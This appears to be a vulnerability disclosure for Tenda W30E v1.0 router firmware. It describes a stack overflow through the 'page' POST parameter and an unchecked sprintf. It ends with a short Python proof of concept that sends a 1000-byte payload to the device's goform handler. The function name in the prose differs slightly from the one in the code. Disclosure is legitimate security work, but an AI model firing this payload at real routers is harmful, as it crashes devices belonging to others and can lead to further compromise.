## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability located in the `frmL7PlotForm` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v10, "firewall_proto_list.asp?page=%s", v11);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v10` array, thus triggering this security vulnerability.

![image-20240409103523512](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409103523512.png)

![image-20240409103507530](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409103507530.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/frmL7ProtForm"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409103000348](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409103000348.png)